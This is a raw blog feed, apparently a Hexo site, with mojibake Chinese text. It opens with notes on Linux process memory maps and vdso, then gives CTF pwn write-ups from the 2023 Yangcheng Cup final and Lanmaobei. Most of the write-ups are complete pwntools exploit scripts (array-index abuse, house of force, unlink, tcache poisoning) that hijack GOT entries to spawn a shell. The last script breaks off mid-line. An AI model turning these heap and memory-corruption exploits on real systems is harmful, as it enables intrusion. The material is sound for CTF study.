//mmapå‡ºçš„åŒ¿åæ˜ å°„ å¯¹äºä¸€äº›è¾ƒå¤§çš„æœªåˆå§‹åŒ–å…¨å±€æ•°ç»„å°±æ˜¯è¿™æ ·æ˜ å°„çš„</span><br><span class="line">7ffff7fa4000-7ffff7fa7000 rw-p 00000000 00:00 0                             //mmapå‡ºçš„åŒ¿åæ˜ å°„</span><br><span class="line">7ffff7fbb000-7ffff7fbd000 rw-p 00000000 00:00 0                             //mmapå‡ºçš„åŒ¿åæ˜ å°„</span><br><span class="line">7ffff7fbd000-7ffff7fc1000 r--p 00000000 00:00 0                          [vvar]</span><br><span class="line">7ffff7fc1000-7ffff7fc3000 r-xp 00000000 00:00 0                          [vdso]</span><br><span class="line">7ffff7fc3000-7ffff7fc5000 r--p 00000000 08:03 2885983                    /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2</span><br><span class="line">7ffff7fc5000-7ffff7fef000 r-xp 00002000 08:03 2885983                    /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2</span><br><span class="line">7ffff7fef000-7ffff7ffa000 r--p 0002c000 08:03 2885983                    /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2</span><br><span class="line">7ffff7ffb000-7ffff7ffd000 r--p 00037000 08:03 2885983                    /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2</span><br><span class="line">7ffff7ffd000-7ffff7fff000 rw-p 00039000 08:03 2885983                    /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2</span><br><span class="line">7ffffffdd000-7ffffffff000 rw-p 00000000 00:00 0                          [stack]</span><br><span class="line">ffffffffff600000-ffffffffff601000 --xp 00000000 00:00 0                  [vsyscall]</span><br></pre></td></tr></table></figure><h3 id="vsyscallâ€“-gt-vdso"><a href="#vsyscallâ€“-gt-vdso" class="headerlink" title="vsyscallâ€“&gt;vdso"></a>vsyscallâ€“&gt;vdso</h3><p>å…·ä½“çœ‹ï¼š<a href="https://zhuanlan.zhihu.com/p/436454953">https://zhuanlan.zhihu.com/p/436454953</a></p><p>virtual dynamic shared object</p><p>å¯ä»¥ç›´æ¥è®¿é—®éƒ¨åˆ†å†…æ ¸çš„å…±äº«é¡µï¼Œå…±äº«é¡µæ¯éš”ä¸€å®šæ—¶é—´åˆ·æ–°ä¸€æ¬¡ï¼Œå¯¹äºä¸€äº›åªéœ€è¦è¯»å†…æ ¸çš„ç³»ç»Ÿè°ƒç”¨ä¸éœ€è¦é™·å…¥å†…æ ¸ï¼Œvsyscallåœ°å€å›ºå®šä½†æ˜¯å·²ç»å¼ƒç”¨äº†</p><p>man vdsoæ‰‹å†Œåé¢ç»™å‡ºäº†å„ä¸ªæ¶æ„vdsoæ”¯æŒçš„å‡½æ•°</p><h3 id="execveå"><a href="#execveå" class="headerlink" title="execveå"></a>execveå</h3><p>è¿›ç¨‹åªæœ‰å°‘é‡å†…å­˜æ˜ å°„</p><ul><li>é™æ€é“¾æ¥ï¼šä»£ç ã€æ•°æ®ã€å †æ ˆã€å †åŒº</li><li>åŠ¨æ€é“¾æ¥ï¼šä»£ç ã€æ•°æ®ã€å †æ ˆã€å †åŒºã€INTERP (ld.so)</li></ul><p><img src="/2023/09/23/OSTEP-13-14-Process-and-Address-Spaces/image-20230924133834423.png" alt="image-20230924133834423"></p><p>åˆšå¼€å§‹æ²¡æœ‰libcï¼ŒåŠ¨æ€åŠ è½½å™¨ldåˆ©ç”¨ä¸€ç³»åˆ—ç³»ç»Ÿè°ƒç”¨åŠ è½½libc.so</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">mmap</span><span class="params">(<span class="type">void</span> *addr, <span class="type">size_t</span> length, <span class="type">int</span> prot, <span class="type">int</span> flags, <span class="type">int</span> fd, <span class="type">off_t</span> offset)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">munmap</span><span class="params">(<span class="type">void</span> *addr, <span class="type">size_t</span> length)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">mprotect</span><span class="params">(<span class="type">void</span> *addr, <span class="type">size_t</span> length, <span class="type">int</span> prot)</span>;</span><br></pre></td></tr></table></figure><p><img src="/2023/09/23/OSTEP-13-14-Process-and-Address-Spaces/image-20230924141641580.png" alt="image-20230924141641580"></p><p>elfå‘Šè¯‰æ“ä½œç³»ç»Ÿè¿›ç¨‹å¦‚ä½•åŠ è½½ï¼Œæ“ä½œç³»ç»Ÿåˆ©ç”¨mmapå»æ˜ å°„ç£ç›˜ï¼Œæ‡’åŠ è½½(ä½¿ç”¨æ—¶è§¦å‘ç¼ºé¡µä¸­æ–­)</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2023 ç¾ŠåŸæ¯å†³èµ›</title>
      <link href="/2023/09/21/2023-ycbfinal/"/>
      <url>/2023/09/21/2023-ycbfinal/</url>
      
        <content type="html"><![CDATA[<h3 id="arrary-index-bank"><a href="#arrary-index-bank" class="headerlink" title="arrary_index_bank"></a>arrary_index_bank</h3><p>ç»™äº†åé—¨</p><p>æ„è¯†åˆ°äº†æ•°ç»„ä¸‹æ ‡å¯ä»¥ä¸ºè´Ÿæ•°æ¥åœ¨æ ˆä¸Šæ— é™åæº¢æ¥æ³„éœ²libcï¼Œæ ˆå’Œpieï¼Œä»è€Œä¿®æ”¹æ ˆåŒºä¸Šé¢libcé‡Œçš„å€¼ï¼Œè¿™é‡Œé€‰æ‹©äº†putså‡½æ•°ä¼šåˆ©ç”¨libcé‡Œçš„gotï¼Œæ”¹ä¸ºåé—¨</p><p><img src="/2023/09/21/2023-ycbfinal/image-20230921231258929.png" alt="image-20230921231258929"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">libcelf=elf.libc</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,<span class="string">&#x27;b *&#x27;</span>+x)</span><br><span class="line">dbpie = <span class="keyword">lambda</span> x: gdb.attach(io,<span class="string">&#x27;b *$rebase(&#x27;</span>+x+<span class="string">&#x27;)&#x27;</span>)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_libc</span>(<span class="params">func_name,func_ad</span>):</span><br><span class="line">    p(func_name,func_ad)</span><br><span class="line">    <span class="keyword">global</span> libc </span><br><span class="line">    libc = LibcSearcher(func_name,func_ad)</span><br><span class="line">    libcbase=func_ad-libc.dump(func_name)</span><br><span class="line">    p(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line">    <span class="keyword">return</span> libcbase</span><br><span class="line"><span class="comment">#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="comment"># dbpie(&#x27;0x00144D&#x27;)</span></span><br><span class="line"><span class="comment"># dbpie(&#x27;0x014C6&#x27;)</span></span><br><span class="line">sla(<span class="string">b&#x27;&gt;&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;&gt;&#x27;</span>,<span class="built_in">str</span>(-<span class="number">0x8000000000000000</span> + <span class="number">7</span>).encode())</span><br><span class="line">sla(<span class="string">b&#x27;unt?&#x27;</span>,<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;[-1] = &#x27;</span>)</span><br><span class="line">pie=<span class="built_in">int</span>(r(<span class="built_in">len</span>(<span class="string">&#x27;93824992236582&#x27;</span>)),<span class="number">10</span>)-<span class="number">0x1426</span></span><br><span class="line">backdoor=<span class="number">0x1310</span>+pie</span><br><span class="line">p(<span class="string">&#x27;pie&#x27;</span>,pie)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;&gt;&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;unt?&#x27;</span>,<span class="string">b&#x27;-2&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;[-2] = &#x27;</span>)</span><br><span class="line">stack_base=<span class="built_in">int</span>(r(<span class="built_in">len</span>(<span class="string">&#x27;140737488347072&#x27;</span>)),<span class="number">10</span>)-<span class="number">0x30</span></span><br><span class="line">p(<span class="string">&#x27;stack_base&#x27;</span>,stack_base)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;&gt;&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;unt?&#x27;</span>,<span class="string">b&#x27;-18&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;[-18] = &#x27;</span>)</span><br><span class="line">_IO_2_1_stdin_=<span class="built_in">int</span>(r(<span class="built_in">len</span>(<span class="string">&#x27;140737488347072&#x27;</span>)),<span class="number">10</span>)</span><br><span class="line">p(<span class="string">&#x27;_IO_2_1_stdin_&#x27;</span>,_IO_2_1_stdin_)</span><br><span class="line">libcbase=find_libc(<span class="string">&#x27;_IO_2_1_stdin_&#x27;</span>,_IO_2_1_stdin_)</span><br><span class="line">attach= <span class="number">0x219098</span>+libcbase</span><br><span class="line">p(<span class="string">&#x27;attach&#x27;</span>,attach)</span><br><span class="line">index=-((stack_base-attach)//<span class="number">8</span>)</span><br><span class="line">sla(<span class="string">b&#x27;&gt;&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;unt?&#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line">sla(<span class="string">b&#x27;much?&#x27;</span>,<span class="built_in">str</span>(backdoor).encode())</span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>è¿™ç§æ–¹æ³•ï¼Œè¿œç¨‹å¯èƒ½ä¼šæœ‰çš„é—®é¢˜ï¼Œæ›´ç¨³å¦¥è¿˜æ˜¯åˆ©ç”¨æ•´æ•°æº¢å‡ºï¼Œ<strong>åˆšå¼€å§‹æ²¡çœ‹å‡ºæ¥æº¢å‡ºï¼Œèœå“­æƒ¹</strong></p><p><img src="/2023/09/21/2023-ycbfinal/image-20230921231722098.png" alt="image-20230921231722098"></p><p>è¿™é‡Œv3ä½œä¸º__int64 v1[3];ä½œä¸ºæ•°ç»„ä¸‹æ ‡è¿˜éœ€è¦ä¹˜ä»¥8ï¼Œä»è€Œæˆè´Ÿæ•°æº¢å‡ºä¸ºæ­£æ•°ï¼Œå°±å¯ä»¥æ”¹è¿”å›åœ°å€ä¸ºåé—¨</p><h2 id="easy-force"><a href="#easy-force" class="headerlink" title="easy_force"></a>easy_force</h2><p>Ubuntu GLIBC 2.23-0ubuntu11.3çš„libc</p><p>å †æº¢å‡ºï¼Œåªèƒ½ç”³è¯·å››ä¸ªå †ï¼Œæ— å…¶ä»–åŠŸèƒ½ï¼Œæ‰“house of forceï¼Œæ”¹mallocä¸ºogg</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./pwn.bak&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">libcelf=elf.libc</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,<span class="string">&#x27;b *&#x27;</span>+x)</span><br><span class="line">dbpie = <span class="keyword">lambda</span> x: gdb.attach(io,<span class="string">&#x27;b *$rebase(&#x27;</span>+x+<span class="string">&#x27;)&#x27;</span>)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_libc</span>(<span class="params">func_name,func_ad</span>):</span><br><span class="line">    p(func_name,func_ad)</span><br><span class="line">    <span class="keyword">global</span> libc </span><br><span class="line">    libc = LibcSearcher(func_name,func_ad)</span><br><span class="line">    libcbase=func_ad-libc.dump(func_name)</span><br><span class="line">    p(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line">    <span class="keyword">return</span> libcbase</span><br><span class="line"><span class="comment">#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="comment"># db(&#x27;0x04008C6&#x27;)#malloc</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">idx</span>):</span><br><span class="line">  sla(<span class="string">b&#x27; away\n&#x27;</span>,<span class="built_in">str</span>(idx).encode()) </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ask</span>(<span class="params">idx,size,content</span>):</span><br><span class="line">  menu(<span class="number">1</span>)</span><br><span class="line">  sla(<span class="string">b&#x27;ex?\n&#x27;</span>,<span class="built_in">str</span>(idx).encode()) </span><br><span class="line">  sla(<span class="string">b&#x27;want?\n&#x27;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">  sla(<span class="string">b&#x27;rite?\n&#x27;</span>,content)</span><br><span class="line">ask(<span class="number">0</span>,<span class="number">0x50000</span>,<span class="string">b&#x27;ff&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;road on &#x27;</span>)</span><br><span class="line">libcbase=<span class="built_in">int</span>(ru(<span class="string">b&#x27; is&#x27;</span>),<span class="number">16</span>)- <span class="number">0x581010</span></span><br><span class="line">ogg=[x + libcbase <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]]</span><br><span class="line">payload=flat(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">ask(<span class="number">1</span>,<span class="number">1</span>,payload)</span><br><span class="line">ru(<span class="string">b&#x27;road on &#x27;</span>)</span><br><span class="line">topchunk=<span class="built_in">int</span>(ru(<span class="string">b&#x27; is&#x27;</span>),<span class="number">16</span>)+<span class="number">0x10</span></span><br><span class="line">p(<span class="string">&#x27;libc&#x27;</span>,libcbase)</span><br><span class="line">p(<span class="string">&#x27;top&#x27;</span>,topchunk)</span><br><span class="line">offset=elf.got[<span class="string">&#x27;malloc&#x27;</span>]-<span class="number">0x20</span>-topchunk</span><br><span class="line">ask(<span class="number">2</span>,offset,<span class="string">b&#x27;&#x27;</span>)</span><br><span class="line">ask(<span class="number">3</span>,<span class="number">1</span>,p64(ogg[<span class="number">3</span>]))</span><br><span class="line">menu(<span class="number">1</span>)</span><br><span class="line">sla(<span class="string">b&#x27;ex?\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">4</span>).encode()) </span><br><span class="line">sla(<span class="string">b&#x27;want?\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>).encode())</span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="printf-but-not-fmtsrt"><a href="#printf-but-not-fmtsrt" class="headerlink" title="printf but not fmtsrt"></a>printf but not fmtsrt</h2><p>libc2.36 å­˜åœ¨åé—¨å’Œuafï¼Œé™åˆ¶äº†å †å—å¤§å°ï¼Œæ²¡å¼€pieå¯ä»¥åˆ©ç”¨å †æŒ‡é’ˆæ•°ç»„é‡Œçš„å †åœ°å€ï¼Œç»•è¿‡unlinkæ£€æŸ¥ï¼Œå°†å †æŒ‡é’ˆæ•°ç»„çš„åœ°å€å†™å…¥å…¶ä¸­ï¼Œä»è€Œæ§åˆ¶putsgotä¸ºåé—¨</p><p>è¸©çš„ä¸€ä¸ªå‘å°±æ˜¯unlinkæ—¶ä¼šæ£€æŸ¥å †å—çš„0x20å¤„åç§»æ˜¯å¦ä¸º0ï¼Œæ‰€ä»¥editæ—¶ç”¨sendlineä¼šä½¿+0x20å¤„ä¸ºä¸€ä¸ªâ€˜\nâ€™ï¼Œä»è€Œå¯¼è‡´unlinkå¤±è´¥</p><p><img src="/2023/09/21/2023-ycbfinal/image-20230922130626468.png" alt="image-20230922130626468"></p><p>è§¦å‘unlinkçš„å †æ„é€ </p><p><img src="/2023/09/21/2023-ycbfinal/image-20230922134116399.png" alt="image-20230922134116399"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">libcelf=elf.libc</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,<span class="string">&#x27;b *&#x27;</span>+x)</span><br><span class="line">dbpie = <span class="keyword">lambda</span> x: gdb.attach(io,<span class="string">&#x27;b *$rebase(&#x27;</span>+x+<span class="string">&#x27;)&#x27;</span>)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_libc</span>(<span class="params">func_name,func_ad</span>):</span><br><span class="line">    p(func_name,func_ad)</span><br><span class="line">    <span class="keyword">global</span> libc </span><br><span class="line">    libc = LibcSearcher(func_name,func_ad)</span><br><span class="line">    libcbase=func_ad-libc.dump(func_name)</span><br><span class="line">    p(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line">    <span class="keyword">return</span> libcbase</span><br><span class="line"><span class="comment">#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">idx</span>):</span><br><span class="line">  sla(<span class="string">b&#x27;&gt;&#x27;</span>,<span class="built_in">str</span>(idx).encode()) </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,size</span>):</span><br><span class="line">  menu(<span class="number">1</span>)</span><br><span class="line">  sla(<span class="string">b&#x27;ndex: &#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">  sla(<span class="string">b&#x27;Size: &#x27;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">  menu(<span class="number">2</span>)</span><br><span class="line">  sla(<span class="string">b&#x27;ndex: &#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">  menu(<span class="number">3</span>) </span><br><span class="line">  sla(<span class="string">b&#x27;ndex: &#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">  sa(<span class="string">b&#x27;tent: &#x27;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">  menu(<span class="number">4</span>)</span><br><span class="line">  sla(<span class="string">b&#x27;ndex: &#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">backdoor=<span class="number">0x4011D6</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x520</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x520</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x520</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x530</span>)<span class="comment">#åˆ‡å‰²unsortedbinï¼Œä½¿editå¯ä»¥ä¿®æ”¹åˆ°å †å—å¤´éƒ¨å¼€å§‹å¤„</span></span><br><span class="line">edit(<span class="number">1</span>, flat([<span class="number">0</span>, <span class="number">0x521</span>, <span class="number">0x4040E8</span> - <span class="number">0x18</span>, <span class="number">0x4040E8</span> - <span class="number">0x10</span>]))</span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line">delete(<span class="number">2</span>)<span class="comment">#è§¦å‘unlink</span></span><br><span class="line">edit(<span class="number">1</span>,flat(<span class="number">0</span>,<span class="number">0</span>,elf.got[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line">edit(<span class="number">0</span>,p64(backdoor))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2023 è“å¸½æ¯</title>
      <link href="/2023/09/15/2023-lmb/"/>
      <url>/2023/09/15/2023-lmb/</url>
      
        <content type="html"><![CDATA[<h2 id="takeway"><a href="#takeway" class="headerlink" title="takeway"></a>takeway</h2><p>libc2.31çš„uafï¼Œå¯ä»¥ç›´æ¥è¦†ç›–tcacheçš„nextæ¥ä»»æ„åœ°å€ç”³è¯·å †å—</p><p>æ€è·¯å°±æ˜¯é€šè¿‡uafå’Œtcacheçš„keyæ³„éœ²å‡ºå †åœ°å€å°±å¯ä»¥è·å¾—æˆ‘ä»¬ç”³è¯·çš„å †åœ°å€ï¼Œç”³è¯·åˆ°0x4040A0å¤„çš„å †ç®¡ç†ç»“æ„æŒ‡é’ˆåå°±å¯ä»¥æ”¹ä»–çš„å€¼ä¸ºæˆ‘ä»¬å¯æ§çš„å †ï¼Œæå‰æŠŠå¯æ§å †é‡Œçš„å†…å®¹æ”¹å®Œfreeçš„got editåŠŸèƒ½æ—¶å°±å¯ä»¥æ³„éœ²åŸºåœ°å€å’Œä¿®æ”¹freegotä¸ºsystem</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./takeway&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">libcelf=elf.libc</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,<span class="string">&#x27;b *&#x27;</span>+x)</span><br><span class="line">dbpie = <span class="keyword">lambda</span> x: gdb.attach(io,<span class="string">&#x27;b *$rebase(&#x27;</span>+x+<span class="string">&#x27;)&#x27;</span>)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span 